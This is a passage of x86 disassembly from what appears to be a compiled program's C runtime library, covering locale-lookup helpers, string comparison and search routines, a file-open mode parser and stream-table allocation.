  435230:	pop    ecx
  435231:	jne    0x435244
  435233:	or     WORD PTR ds:0x43fe28,0x304
  43523c:	mov    DWORD PTR ds:0x43fe2c,esi
  435242:	jmp    0x4352b1
  435244:	test   BYTE PTR ds:0x43fe28,0x2
  43524b:	jne    0x4352b7
  43524d:	mov    eax,ds:0x43fe40
  435252:	test   eax,eax
  435254:	je     0x435296
  435256:	push   eax
  435257:	lea    eax,[ebp-0x7c]
  43525a:	push   eax
  43525b:	push   DWORD PTR ds:0x43fe44
  435261:	call   0x43741f
  435266:	add    esp,0xc
  435269:	test   eax,eax
  43526b:	jne    0x435296
  43526d:	push   DWORD PTR ds:0x43fe44
  435273:	or     DWORD PTR ds:0x43fe28,0x2
  43527a:	mov    DWORD PTR ds:0x43fe30,esi
  435280:	call   0x42e160
  435285:	cmp    eax,DWORD PTR ds:0x43fe40
  43528b:	pop    ecx
  43528c:	jne    0x4352b7
  43528e:	mov    DWORD PTR ds:0x43fe2c,esi
  435294:	jmp    0x4352b7
  435296:	test   BYTE PTR ds:0x43fe28,0x1
  43529d:	jne    0x4352b7
  43529f:	push   esi
  4352a0:	call   0x434f34
  4352a5:	test   eax,eax
  4352a7:	pop    ecx
  4352a8:	je     0x4352b7
  4352aa:	or     DWORD PTR ds:0x43fe28,0x1
  4352b1:	mov    DWORD PTR ds:0x43fe30,esi
  4352b7:	mov    ecx,DWORD PTR ds:0x43fe28
  4352bd:	mov    eax,0x300
  4352c2:	and    ecx,eax
  4352c4:	cmp    ecx,eax
  4352c6:	je     0x43538a
  4352cc:	push   0x78
  4352ce:	lea    eax,[ebp-0x7c]
  4352d1:	push   eax
  4352d2:	mov    eax,ds:0x43fe34
  4352d7:	neg    eax
  4352d9:	sbb    eax,eax
  4352db:	and    eax,ebx
  4352dd:	add    eax,edi
  4352df:	push   eax
  4352e0:	push   esi
  4352e1:	call   DWORD PTR ds:0x43fe48
  4352e7:	test   eax,eax
  4352e9:	jne    0x4352fa
  4352eb:	and    DWORD PTR ds:0x43fe28,0x0
  4352f2:	xor    eax,eax
  4352f4:	inc    eax
  4352f5:	jmp    0x435397
  4352fa:	lea    eax,[ebp-0x7c]
  4352fd:	push   eax
  4352fe:	push   DWORD PTR ds:0x43fe44
  435304:	call   0x43732e
  435309:	pop    ecx
  43530a:	xor    edi,edi
  43530c:	test   eax,eax
  43530e:	pop    ecx
  43530f:	jne    0x435340
  435311:	or     BYTE PTR ds:0x43fe29,0x2
  435318:	cmp    DWORD PTR ds:0x43fe34,edi
  43531e:	jne    0x435375
  435320:	cmp    DWORD PTR ds:0x43fe40,edi
  435326:	je     0x435375
  435328:	push   DWORD PTR ds:0x43fe44
  43532e:	call   0x42e160
  435333:	cmp    eax,DWORD PTR ds:0x43fe40
  435339:	pop    ecx
  43533a:	jne    0x435375
  43533c:	push   0x1
  43533e:	jmp    0x435369
  435340:	cmp    DWORD PTR ds:0x43fe34,edi
  435346:	jne    0x43538a
  435348:	mov    eax,ds:0x43fe40
  43534d:	cmp    eax,edi
  43534f:	je     0x43538a
  435351:	push   eax
  435352:	lea    eax,[ebp-0x7c]
  435355:	push   eax
  435356:	push   DWORD PTR ds:0x43fe44
  43535c:	call   0x43741f
  435361:	add    esp,0xc
  435364:	test   eax,eax
  435366:	jne    0x43538a
  435368:	push   edi
  435369:	push   esi
  43536a:	call   0x43511b
  43536f:	test   eax,eax
  435371:	pop    ecx
  435372:	pop    ecx
  435373:	je     0x43538a
  435375:	or     BYTE PTR ds:0x43fe29,0x1
  43537c:	cmp    DWORD PTR ds:0x43fe2c,edi
  435382:	jne    0x43538a
  435384:	mov    DWORD PTR ds:0x43fe2c,esi
  43538a:	mov    eax,ds:0x43fe28
  43538f:	shr    eax,0x2
  435392:	not    eax
  435394:	and    eax,0x1
  435397:	pop    edi
  435398:	pop    ebx
  435399:	mov    ecx,DWORD PTR [ebp-0x4]
  43539c:	pop    esi
  43539d:	call   0x42f1f2
  4353a2:	leave  
  4353a3:	ret    0x4
  4353a6:	push   ebp
  4353a7:	mov    ebp,esp
  4353a9:	sub    esp,0x7c
  4353ac:	mov    eax,ds:0x43d404
  4353b1:	mov    edx,DWORD PTR [ebp+0x8]
  4353b4:	push   esi
  4353b5:	mov    DWORD PTR [ebp-0x4],eax
  4353b8:	call   0x435035
  4353bd:	mov    esi,eax
  4353bf:	push   0x78
  4353c1:	lea    eax,[ebp-0x7c]
  4353c4:	push   eax
  4353c5:	mov    eax,ds:0x43fe34
  4353ca:	neg    eax
  4353cc:	sbb    eax,eax
  4353ce:	and    eax,0xfffff002
  4353d3:	add    eax,0x1001
  4353d8:	push   eax
  4353d9:	push   esi
  4353da:	call   DWORD PTR ds:0x43fe48
  4353e0:	test   eax,eax
  4353e2:	jne    0x4353ed
  4353e4:	and    DWORD PTR ds:0x43fe28,eax
  4353ea:	inc    eax
  4353eb:	jmp    0x435464
  4353ed:	lea    eax,[ebp-0x7c]
  4353f0:	push   eax
  4353f1:	push   DWORD PTR ds:0x43fe44
  4353f7:	call   0x43732e
  4353fc:	test   eax,eax
  4353fe:	pop    ecx
  4353ff:	pop    ecx
  435400:	jne    0x43540e
  435402:	cmp    DWORD PTR ds:0x43fe34,eax
  435408:	jne    0x435444
  43540a:	push   0x1
  43540c:	jmp    0x435438
  43540e:	cmp    DWORD PTR ds:0x43fe34,0x0
  435415:	jne    0x435457
  435417:	mov    eax,ds:0x43fe40
  43541c:	test   eax,eax
  43541e:	je     0x435457
  435420:	push   eax
  435421:	lea    eax,[ebp-0x7c]
  435424:	push   eax
  435425:	push   DWORD PTR ds:0x43fe44
  43542b:	call   0x43741f
  435430:	add    esp,0xc
  435433:	test   eax,eax
  435435:	jne    0x435457
  435437:	push   eax
  435438:	push   esi
  435439:	call   0x43511b
  43543e:	test   eax,eax
  435440:	pop    ecx
  435441:	pop    ecx
  435442:	je     0x435457
  435444:	or     DWORD PTR ds:0x43fe28,0x4
  43544b:	mov    DWORD PTR ds:0x43fe30,esi
  435451:	mov    DWORD PTR ds:0x43fe2c,esi
  435457:	mov    eax,ds:0x43fe28
  43545c:	shr    eax,0x2
  43545f:	not    eax
  435461:	and    eax,0x1
  435464:	mov    ecx,DWORD PTR [ebp-0x4]
  435467:	pop    esi
  435468:	call   0x42f1f2
  43546d:	leave  
  43546e:	ret    0x4
  435471:	push   DWORD PTR ds:0x43fe3c
  435477:	call   0x42e160
  43547c:	sub    eax,0x3
  43547f:	neg    eax
  435481:	pop    ecx
  435482:	sbb    eax,eax
  435484:	push   0x1
  435486:	inc    eax
  435487:	push   0x435087
  43548c:	mov    ds:0x43fe38,eax
  435491:	call   DWORD PTR ds:0x439128
  435497:	test   BYTE PTR ds:0x43fe28,0x4
  43549e:	jne    0x4354a7
  4354a0:	and    DWORD PTR ds:0x43fe28,0x0
  4354a7:	ret    
  4354a8:	push   DWORD PTR ds:0x43fe44
  4354ae:	call   0x42e160
  4354b3:	push   DWORD PTR ds:0x43fe3c
  4354b9:	sub    eax,0x3
  4354bc:	neg    eax
  4354be:	sbb    eax,eax
  4354c0:	inc    eax
  4354c1:	mov    ds:0x43fe34,eax
  4354c6:	call   0x42e160
  4354cb:	sub    eax,0x3
  4354ce:	neg    eax
  4354d0:	sbb    eax,eax
  4354d2:	and    DWORD PTR ds:0x43fe2c,0x0
  4354d9:	inc    eax
  4354da:	cmp    DWORD PTR ds:0x43fe34,0x0
  4354e1:	pop    ecx
  4354e2:	pop    ecx
  4354e3:	mov    ds:0x43fe38,eax
  4354e8:	je     0x4354f6
  4354ea:	mov    DWORD PTR ds:0x43fe40,0x2
  4354f4:	jmp    0x435506
  4354f6:	mov    edx,DWORD PTR ds:0x43fe44
  4354fc:	call   0x43506a
  435501:	mov    ds:0x43fe40,eax
  435506:	push   0x1
  435508:	push   0x43518c
  43550d:	call   DWORD PTR ds:0x439128
  435513:	mov    eax,ds:0x43fe28
  435518:	test   ah,0x1
  43551b:	je     0x435526
  43551d:	test   ah,0x2
  435520:	je     0x435526
  435522:	test   al,0x7
  435524:	jne    0x43552d
  435526:	and    DWORD PTR ds:0x43fe28,0x0
  43552d:	ret    
  43552e:	push   DWORD PTR ds:0x43fe44
  435534:	call   0x42e160
  435539:	sub    eax,0x3
  43553c:	neg    eax
  43553e:	sbb    eax,eax
  435540:	inc    eax
  435541:	pop    ecx
  435542:	mov    ds:0x43fe34,eax
  435547:	je     0x435555
  435549:	mov    DWORD PTR ds:0x43fe40,0x2
  435553:	jmp    0x435565
  435555:	mov    edx,DWORD PTR ds:0x43fe44
  43555b:	call   0x43506a
  435560:	mov    ds:0x43fe40,eax
  435565:	push   0x1
  435567:	push   0x4353a6
  43556c:	call   DWORD PTR ds:0x439128
  435572:	test   BYTE PTR ds:0x43fe28,0x4
  435579:	jne    0x435582
  43557b:	and    DWORD PTR ds:0x43fe28,0x0
  435582:	ret    
  435583:	push   ebx
  435584:	xor    ebx,ebx
  435586:	cmp    DWORD PTR ds:0x43fe48,ebx
  43558c:	push   esi
  43558d:	jne    0x4355ae
  43558f:	cmp    DWORD PTR ds:0x43fcb0,0x2
  435596:	jne    0x4355a4
  435598:	mov    eax,ds:0x439124
  43559d:	mov    ds:0x43fe48,eax
  4355a2:	jmp    0x4355ae
  4355a4:	mov    DWORD PTR ds:0x43fe48,0x434f52
  4355ae:	mov    esi,DWORD PTR [esp+0xc]
  4355b2:	cmp    esi,ebx
  4355b4:	je     0x43565d
  4355ba:	lea    eax,[esi+0x40]
  4355bd:	cmp    eax,ebx
  4355bf:	mov    ecx,esi
  4355c1:	mov    DWORD PTR ds:0x43fe44,ecx
  4355c7:	mov    ds:0x43fe3c,eax
  4355cc:	je     0x4355f1
  4355ce:	cmp    BYTE PTR [eax],bl
  4355d0:	je     0x4355f1
  4355d2:	push   0x43fe3c
  4355d7:	push   0x16
  4355d9:	push   0x43ab28
  4355de:	call   0x434e44
  4355e3:	mov    ecx,DWORD PTR ds:0x43fe44
  4355e9:	mov    eax,ds:0x43fe3c
  4355ee:	add    esp,0xc
  4355f1:	cmp    ecx,ebx
  4355f3:	mov    DWORD PTR ds:0x43fe28,ebx
  4355f9:	je     0x43564e
  4355fb:	cmp    BYTE PTR [ecx],bl
  4355fd:	je     0x43564e
  4355ff:	cmp    eax,ebx
  435601:	je     0x43560e
  435603:	cmp    BYTE PTR [eax],bl
  435605:	je     0x43560e
  435607:	call   0x4354a8
  43560c:	jmp    0x435613
  43560e:	call   0x43552e
  435613:	cmp    DWORD PTR ds:0x43fe28,ebx
  435619:	jne    0x435671
  43561b:	push   0x43fe44
  435620:	push   0x40
  435622:	push   0x43acd8
  435627:	call   0x434e44
  43562c:	add    esp,0xc
  43562f:	test   eax,eax
  435631:	je     0x435662
  435633:	mov    eax,ds:0x43fe3c
  435638:	cmp    eax,ebx
  43563a:	je     0x435647
  43563c:	cmp    BYTE PTR [eax],bl
  43563e:	je     0x435647
  435640:	call   0x4354a8
  435645:	jmp    0x435662
  435647:	call   0x43552e
  43564c:	jmp    0x435662
  43564e:	cmp    eax,ebx
  435650:	je     0x43565d
  435652:	cmp    BYTE PTR [eax],bl
  435654:	je     0x43565d
  435656:	call   0x435471
  43565b:	jmp    0x435662
  43565d:	call   0x434ea4
  435662:	cmp    DWORD PTR ds:0x43fe28,ebx
  435668:	jne    0x435671
  43566a:	xor    eax,eax
  43566c:	jmp    0x435735
  435671:	push   edi
  435672:	lea    ecx,[esi+0x80]
  435678:	call   0x434ebe
  43567d:	mov    edi,eax
  43567f:	cmp    edi,ebx
  435681:	je     0x435732
  435687:	movzx  eax,di
  43568a:	push   eax
  43568b:	call   DWORD PTR ds:0x439130
  435691:	test   eax,eax
  435693:	je     0x435732
  435699:	push   0x1
  43569b:	push   DWORD PTR ds:0x43fe2c
  4356a1:	call   DWORD PTR ds:0x43912c
  4356a7:	test   eax,eax
  4356a9:	je     0x435732
  4356af:	mov    eax,DWORD PTR [esp+0x14]
  4356b3:	cmp    eax,ebx
  4356b5:	mov    ecx,DWORD PTR ds:0x43fe2c
  4356bb:	je     0x4356cf
  4356bd:	mov    dx,WORD PTR ds:0x43fe30
  4356c4:	mov    WORD PTR [eax],cx
  4356c7:	mov    WORD PTR [eax+0x2],dx
  4356cb:	mov    WORD PTR [eax+0x4],di
  4356cf:	mov    esi,DWORD PTR [esp+0x18]
  4356d3:	cmp    esi,ebx
  4356d5:	je     0x43572d
  4356d7:	cmp    WORD PTR [eax],0x814
  4356dc:	jne    0x4356ed
  4356de:	push   0x43b2fc
  4356e3:	push   esi
  4356e4:	call   0x432780
  4356e9:	pop    ecx
  4356ea:	pop    ecx
  4356eb:	jmp    0x435700
  4356ed:	push   0x40
  4356ef:	push   esi
  4356f0:	push   0x1001
  4356f5:	push   ecx
  4356f6:	call   DWORD PTR ds:0x43fe48
  4356fc:	test   eax,eax
  4356fe:	je     0x435732
  435700:	push   0x40
  435702:	lea    eax,[esi+0x40]
  435705:	push   eax
  435706:	push   0x1002
  43570b:	push   DWORD PTR ds:0x43fe30
  435711:	call   DWORD PTR ds:0x43fe48
  435717:	test   eax,eax
  435719:	je     0x435732
  43571b:	push   0xa
  43571d:	add    esi,0x80
  435723:	push   esi
  435724:	push   edi
  435725:	call   0x4374dc
  43572a:	add    esp,0xc
  43572d:	xor    eax,eax
  43572f:	inc    eax
  435730:	jmp    0x435734
  435732:	xor    eax,eax
  435734:	pop    edi
  435735:	pop    esi
  435736:	pop    ebx
  435737:	ret    
  435738:	push   0x1c
  43573a:	push   0x43b310
  43573f:	call   0x431210
  435744:	xor    esi,esi
  435746:	cmp    DWORD PTR ds:0x43fe6c,esi
  43574c:	jne    0x435783
  43574e:	lea    eax,[ebp-0x1c]
  435751:	push   eax
  435752:	xor    edi,edi
  435754:	inc    edi
  435755:	push   edi
  435756:	push   0x439764
  43575b:	push   edi
  43575c:	call   DWORD PTR ds:0x439138
  435762:	test   eax,eax
  435764:	je     0x43576e
  435766:	mov    DWORD PTR ds:0x43fe6c,edi
  43576c:	jmp    0x435783
  43576e:	call   DWORD PTR ds:0x4390ac
  435774:	cmp    eax,0x78
  435777:	jne    0x435783
  435779:	mov    DWORD PTR ds:0x43fe6c,0x2
  435783:	mov    eax,ds:0x43fe6c
  435788:	cmp    eax,0x2
  43578b:	je     0x43587b
  435791:	cmp    eax,esi
  435793:	je     0x43587b
  435799:	cmp    eax,0x1
  43579c:	jne    0x4358a1
  4357a2:	mov    DWORD PTR [ebp-0x24],esi
  4357a5:	mov    DWORD PTR [ebp-0x20],esi
  4357a8:	cmp    DWORD PTR [ebp+0x18],esi
  4357ab:	jne    0x4357b5
  4357ad:	mov    eax,ds:0x43fe64
  4357b2:	mov    DWORD PTR [ebp+0x18],eax
  4357b5:	push   esi
  4357b6:	push   esi
  4357b7:	push   DWORD PTR [ebp+0x10]
  4357ba:	push   DWORD PTR [ebp+0xc]
  4357bd:	xor    eax,eax
  4357bf:	cmp    DWORD PTR [ebp+0x20],esi
  4357c2:	setne  al
  4357c5:	lea    eax,[eax*8+0x1]
  4357cc:	push   eax
  4357cd:	push   DWORD PTR [ebp+0x18]
  4357d0:	call   DWORD PTR ds:0x4390a8
  4357d6:	mov    edi,eax
  4357d8:	mov    DWORD PTR [ebp-0x28],edi
  4357db:	test   edi,edi
  4357dd:	je     0x4358a1
  4357e3:	and    DWORD PTR [ebp-0x4],0x0
  4357e7:	lea    ebx,[edi+edi*1]
  4357ea:	mov    eax,ebx
  4357ec:	add    eax,0x3
  4357ef:	and    eax,0xfffffffc
  4357f2:	call   0x433bb0
  4357f7:	mov    DWORD PTR [ebp-0x18],esp
  4357fa:	mov    esi,esp
  4357fc:	mov    DWORD PTR [ebp-0x2c],esi
  4357ff:	push   ebx
  435800:	push   0x0
  435802:	push   esi
  435803:	call   0x42e4e0
  435808:	add    esp,0xc
  43580b:	or     DWORD PTR [ebp-0x4],0xffffffff
  43580f:	jmp    0x435826
  435811:	xor    eax,eax
  435813:	inc    eax
  435814:	ret    
  435815:	mov    esp,DWORD PTR [ebp-0x18]
  435818:	call   0x435e66
  43581d:	xor    esi,esi
  43581f:	or     DWORD PTR [ebp-0x4],0xffffffff
  435823:	mov    edi,DWORD PTR [ebp-0x28]
  435826:	test   esi,esi
  435828:	jne    0x435841
  43582a:	push   edi
  43582b:	push   0x2
  43582d:	call   0x4340db
  435832:	pop    ecx
  435833:	pop    ecx
  435834:	mov    esi,eax
  435836:	test   esi,esi
  435838:	je     0x4358a1
  43583a:	mov    DWORD PTR [ebp-0x20],0x1
  435841:	push   edi
  435842:	push   esi
  435843:	push   DWORD PTR [ebp+0x10]
  435846:	push   DWORD PTR [ebp+0xc]
  435849:	push   0x1
  43584b:	push   DWORD PTR [ebp+0x18]
  43584e:	call   DWORD PTR ds:0x4390a8
  435854:	test   eax,eax
  435856:	je     0x435869
  435858:	push   DWORD PTR [ebp+0x14]
  43585b:	push   eax
  43585c:	push   esi
  43585d:	push   DWORD PTR [ebp+0x8]
  435860:	call   DWORD PTR ds:0x439138
  435866:	mov    DWORD PTR [ebp-0x24],eax
  435869:	cmp    DWORD PTR [ebp-0x20],0x0
  43586d:	je     0x435876
  43586f:	push   esi
  435870:	call   0x42e0ed
  435875:	pop    ecx
  435876:	mov    eax,DWORD PTR [ebp-0x24]
  435879:	jmp    0x4358e9
  43587b:	mov    ebx,DWORD PTR [ebp+0x1c]
  43587e:	cmp    ebx,esi
  435880:	jne    0x435888
  435882:	mov    ebx,DWORD PTR ds:0x43fe54
  435888:	mov    edi,DWORD PTR [ebp+0x18]
  43588b:	test   edi,edi
  43588d:	jne    0x435895
  43588f:	mov    edi,DWORD PTR ds:0x43fe64
  435895:	push   ebx
  435896:	call   0x435c5a
  43589b:	pop    ecx
  43589c:	cmp    eax,0xffffffff
  43589f:	jne    0x4358a5
  4358a1:	xor    eax,eax
  4358a3:	jmp    0x4358e9
  4358a5:	cmp    eax,edi
  4358a7:	je     0x4358c7
  4358a9:	push   0x0
  4358ab:	push   0x0
  4358ad:	lea    ecx,[ebp+0x10]
  4358b0:	push   ecx
  4358b1:	push   DWORD PTR [ebp+0xc]
  4358b4:	push   eax
  4358b5:	push   edi
  4358b6:	call   0x435c9d
  4358bb:	add    esp,0x18
  4358be:	mov    esi,eax
  4358c0:	test   esi,esi
  4358c2:	je     0x4358a1
  4358c4:	mov    DWORD PTR [ebp+0xc],esi
  4358c7:	push   DWORD PTR [ebp+0x14]
  4358ca:	push   DWORD PTR [ebp+0x10]
  4358cd:	push   DWORD PTR [ebp+0xc]
  4358d0:	push   DWORD PTR [ebp+0x8]
  4358d3:	push   ebx
  4358d4:	call   DWORD PTR ds:0x439134
  4358da:	mov    edi,eax
  4358dc:	test   esi,esi
  4358de:	je     0x4358e7
  4358e0:	push   esi
  4358e1:	call   0x42e0ed
  4358e6:	pop    ecx
  4358e7:	mov    eax,edi
  4358e9:	lea    esp,[ebp-0x38]
  4358ec:	call   0x43124b
  4358f1:	ret    
  4358f2:	int3   
  4358f3:	int3   
  4358f4:	int3   
  4358f5:	int3   
  4358f6:	int3   
  4358f7:	int3   
  4358f8:	int3   
  4358f9:	int3   
  4358fa:	int3   
  4358fb:	int3   
  4358fc:	int3   
  4358fd:	int3   
  4358fe:	int3   
  4358ff:	int3   
  435900:	push   ebp
  435901:	mov    ebp,esp
  435903:	push   edi
  435904:	push   esi
  435905:	push   ebx
  435906:	mov    ecx,DWORD PTR [ebp+0x10]
  435909:	jecxz  0x435932
  43590b:	mov    ebx,ecx
  43590d:	mov    edi,DWORD PTR [ebp+0x8]
  435910:	mov    esi,edi
  435912:	xor    eax,eax
  435914:	repnz scas al,BYTE PTR es:[edi]
  435916:	neg    ecx
  435918:	add    ecx,ebx
  43591a:	mov    edi,esi
  43591c:	mov    esi,DWORD PTR [ebp+0xc]
  43591f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435921:	mov    al,BYTE PTR [esi-0x1]
  435924:	xor    ecx,ecx
  435926:	cmp    al,BYTE PTR [edi-0x1]
  435929:	ja     0x435930
  43592b:	je     0x435932
  43592d:	sub    ecx,0x2
  435930:	not    ecx
  435932:	mov    eax,ecx
  435934:	pop    ebx
  435935:	pop    esi
  435936:	pop    edi
  435937:	leave  
  435938:	ret    
  435939:	int3   
  43593a:	int3   
  43593b:	int3   
  43593c:	int3   
  43593d:	int3   
  43593e:	int3   
  43593f:	int3   
  435940:	push   ebp
  435941:	mov    ebp,esp
  435943:	push   esi
  435944:	xor    eax,eax
  435946:	push   eax
  435947:	push   eax
  435948:	push   eax
  435949:	push   eax
  43594a:	push   eax
  43594b:	push   eax
  43594c:	push   eax
  43594d:	push   eax
  43594e:	mov    edx,DWORD PTR [ebp+0xc]
  435951:	lea    ecx,[ecx+0x0]
  435954:	mov    al,BYTE PTR [edx]
  435956:	or     al,al
  435958:	je     0x435963
  43595a:	add    edx,0x1
  43595d:	bts    DWORD PTR [esp],eax
  435961:	jmp    0x435954
  435963:	mov    esi,DWORD PTR [ebp+0x8]
  435966:	mov    edi,edi
  435968:	mov    al,BYTE PTR [esi]
  43596a:	or     al,al
  43596c:	je     0x43597a
  43596e:	add    esi,0x1
  435971:	bt     DWORD PTR [esp],eax
  435975:	jae    0x435968
  435977:	lea    eax,[esi-0x1]
  43597a:	add    esp,0x20
  43597d:	pop    esi
  43597e:	leave  
  43597f:	ret    
  435980:	push   esi
  435981:	push   DWORD PTR [esp+0xc]
  435985:	xor    esi,esi
  435987:	push   DWORD PTR [esp+0xc]
  43598b:	inc    esi
  43598c:	call   DWORD PTR ds:0x43913c
  435992:	test   eax,eax
  435994:	je     0x435998
  435996:	xor    esi,esi
  435998:	mov    eax,esi
  43599a:	pop    esi
  43599b:	ret    
  43599c:	push   esi
  43599d:	push   DWORD PTR [esp+0xc]
  4359a1:	xor    esi,esi
  4359a3:	push   DWORD PTR [esp+0xc]
  4359a7:	inc    esi
  4359a8:	call   DWORD PTR ds:0x439000
  4359ae:	test   eax,eax
  4359b0:	je     0x4359b4
  4359b2:	xor    esi,esi
  4359b4:	mov    eax,esi
  4359b6:	pop    esi
  4359b7:	ret    
  4359b8:	push   esi
  4359b9:	push   DWORD PTR [esp+0x8]
  4359bd:	xor    esi,esi
  4359bf:	inc    esi
  4359c0:	call   DWORD PTR ds:0x439140
  4359c6:	test   eax,eax
  4359c8:	je     0x4359cc
  4359ca:	xor    esi,esi
  4359cc:	mov    eax,esi
  4359ce:	pop    esi
  4359cf:	ret    
  4359d0:	push   ebp
  4359d1:	mov    ebp,esp
  4359d3:	push   ecx
  4359d4:	push   ecx
  4359d5:	push   ebx
  4359d6:	push   esi
  4359d7:	mov    esi,DWORD PTR ds:0x43ffd8
  4359dd:	push   edi
  4359de:	mov    edi,DWORD PTR [ebp+0xc]
  4359e1:	mov    al,BYTE PTR [edi]
  4359e3:	xor    ebx,ebx
  4359e5:	cmp    al,0x61
  4359e7:	mov    DWORD PTR [ebp-0x8],ebx
  4359ea:	mov    DWORD PTR [ebp-0x4],ebx
  4359ed:	je     0x435a09
  4359ef:	cmp    al,0x72
  4359f1:	je     0x435a02
  4359f3:	cmp    al,0x77
  4359f5:	jne    0x435b15
  4359fb:	mov    ecx,0x301
  435a00:	jmp    0x435a0e
  435a02:	xor    ecx,ecx
  435a04:	or     esi,0x1
  435a07:	jmp    0x435a11
  435a09:	mov    ecx,0x109
  435a0e:	or     esi,0x2
  435a11:	xor    edx,edx
  435a13:	inc    edx
  435a14:	jmp    0x435af0
  435a19:	cmp    edx,ebx
  435a1b:	je     0x435afb
  435a21:	movsx  eax,al
  435a24:	cmp    eax,0x54
  435a27:	jg     0x435a9a
  435a29:	je     0x435a8d
  435a2b:	sub    eax,0x2b
  435a2e:	je     0x435a77
  435a30:	sub    eax,0x19
  435a33:	je     0x435a6d
  435a35:	sub    eax,0xe
  435a38:	je     0x435a59
  435a3a:	dec    eax
  435a3b:	jne    0x435ad2
  435a41:	cmp    DWORD PTR [ebp-0x4],ebx
  435a44:	jne    0x435ad2
  435a4a:	mov    DWORD PTR [ebp-0x4],0x1
  435a51:	or     ecx,0x20
  435a54:	jmp    0x435af0
  435a59:	cmp    DWORD PTR [ebp-0x4],ebx
  435a5c:	jne    0x435ad2
  435a5e:	mov    DWORD PTR [ebp-0x4],0x1
  435a65:	or     ecx,0x10
  435a68:	jmp    0x435af0
  435a6d:	test   cl,0x40
  435a70:	jne    0x435ad2
  435a72:	or     ecx,0x40
  435a75:	jmp    0x435af0
  435a77:	test   cl,0x2
  435a7a:	jne    0x435ad2
  435a7c:	and    ecx,0xfffffffe
  435a7f:	and    esi,0xfffffffc
  435a82:	or     ecx,0x2
  435a85:	or     esi,0x80
  435a8b:	jmp    0x435af0
  435a8d:	mov    eax,0x1000
  435a92:	test   eax,ecx
  435a94:	jne    0x435ad2
  435a96:	or     ecx,eax
  435a98:	jmp    0x435af0
  435a9a:	sub    eax,0x62
  435a9d:	je     0x435ae5
  435a9f:	dec    eax
  435aa0:	je     0x435acd
  435aa2:	sub    eax,0xb
  435aa5:	je     0x435ab9
  435aa7:	sub    eax,0x6
  435aaa:	jne    0x435ad2
  435aac:	test   ch,0xc0
  435aaf:	jne    0x435ad2
  435ab1:	or     ecx,0x4000
  435ab7:	jmp    0x435af0
  435ab9:	cmp    DWORD PTR [ebp-0x8],ebx
  435abc:	jne    0x435ad2
  435abe:	mov    DWORD PTR [ebp-0x8],0x1
  435ac5:	and    esi,0xffffbfff
  435acb:	jmp    0x435af0
  435acd:	cmp    DWORD PTR [ebp-0x8],ebx
  435ad0:	je     0x435ad6
  435ad2:	xor    edx,edx
  435ad4:	jmp    0x435af0
  435ad6:	mov    DWORD PTR [ebp-0x8],0x1
  435add:	or     esi,0x4000
  435ae3:	jmp    0x435af0
  435ae5:	test   ch,0xc0
  435ae8:	jne    0x435ad2
  435aea:	or     ecx,0x8000
  435af0:	inc    edi
  435af1:	mov    al,BYTE PTR [edi]
  435af3:	cmp    al,bl
  435af5:	jne    0x435a19
  435afb:	push   0x1a4
  435b00:	push   DWORD PTR [ebp+0x10]
  435b03:	push   ecx
  435b04:	push   DWORD PTR [ebp+0x8]
  435b07:	call   0x4377ed
  435b0c:	mov    ecx,eax
  435b0e:	add    esp,0x10
  435b11:	cmp    ecx,ebx
  435b13:	jge    0x435b19
  435b15:	xor    eax,eax
  435b17:	jmp    0x435b33
  435b19:	mov    eax,DWORD PTR [ebp+0x14]
  435b1c:	inc    DWORD PTR ds:0x43fb44
  435b22:	mov    DWORD PTR [eax+0xc],esi
  435b25:	mov    DWORD PTR [eax+0x4],ebx
  435b28:	mov    DWORD PTR [eax],ebx
  435b2a:	mov    DWORD PTR [eax+0x8],ebx
  435b2d:	mov    DWORD PTR [eax+0x1c],ebx
  435b30:	mov    DWORD PTR [eax+0x10],ecx
  435b33:	pop    edi
  435b34:	pop    esi
  435b35:	pop    ebx
  435b36:	leave  
  435b37:	ret    
  435b38:	push   0x10
  435b3a:	push   0x43b320
  435b3f:	call   0x431210
  435b44:	xor    ebx,ebx
  435b46:	xor    edi,edi
  435b48:	mov    DWORD PTR [ebp-0x1c],edi
  435b4b:	push   0x1
  435b4d:	call   0x431126
  435b52:	pop    ecx
  435b53:	mov    DWORD PTR [ebp-0x4],ebx
  435b56:	xor    esi,esi
  435b58:	mov    DWORD PTR [ebp-0x20],esi
  435b5b:	cmp    esi,DWORD PTR ds:0x466260
  435b61:	jge    0x435c27
  435b67:	mov    eax,ds:0x465248
  435b6c:	mov    eax,DWORD PTR [eax+esi*4]
  435b6f:	cmp    eax,ebx
  435b71:	je     0x435bc3
  435b73:	test   BYTE PTR [eax+0xc],0x83
  435b77:	jne    0x435bbc
  435b79:	cmp    esi,0x2
  435b7c:	jle    0x435b95
  435b7e:	cmp    esi,0x14
  435b81:	jge    0x435b95
  435b83:	lea    eax,[esi+0x10]
  435b86:	push   eax
  435b87:	call   0x431086
  435b8c:	pop    ecx
  435b8d:	test   eax,eax
  435b8f:	je     0x435c27
  435b95:	mov    eax,ds:0x465248
  435b9a:	push   DWORD PTR [eax+esi*4]
  435b9d:	push   esi
  435b9e:	call   0x42f3e4
  435ba3:	pop    ecx
  435ba4:	pop    ecx
  435ba5:	mov    eax,ds:0x465248
  435baa:	mov    eax,DWORD PTR [eax+esi*4]
  435bad:	test   BYTE PTR [eax+0xc],0x83
  435bb1:	je     0x435bbf
  435bb3:	push   eax
  435bb4:	push   esi
  435bb5:	call   0x42f436
  435bba:	pop    ecx
  435bbb:	pop    ecx
  435bbc:	inc    esi
  435bbd:	jmp    0x435b58
  435bbf:	mov    edi,eax
  435bc1:	jmp    0x435c24
  435bc3:	shl    esi,0x2
  435bc6:	push   0x38
  435bc8:	call   0x4311fe
  435bcd:	pop    ecx
  435bce:	mov    ecx,DWORD PTR ds:0x465248
  435bd4:	mov    DWORD PTR [esi+ecx*1],eax
  435bd7:	mov    eax,ds:0x465248
  435bdc:	mov    eax,DWORD PTR [esi+eax*1]
  435bdf:	cmp    eax,ebx
  435be1:	je     0x435c27
  435be3:	push   0xfa0
  435be8:	add    eax,0x20
  435beb:	push   eax
  435bec:	call   0x4360f7
  435bf1:	pop    ecx
  435bf2:	pop    ecx
  435bf3:	test   eax,eax
  435bf5:	mov    eax,ds:0x465248
  435bfa:	jne    0x435c0f
  435bfc:	push   DWORD PTR [esi+eax*1]
  435bff:	call   0x42e0ed
  435c04:	pop    ecx
  435c05:	mov    eax,ds:0x465248
  435c0a:	mov    DWORD PTR [esi+eax*1],ebx
  435c0d:	jmp    0x435c27
  435c0f:	mov    eax,DWORD PTR [esi+eax*1]
  435c12:	add    eax,0x20
  435c15:	push   eax
  435c16:	call   DWORD PTR ds:0x439088
  435c1c:	mov    eax,ds:0x465248
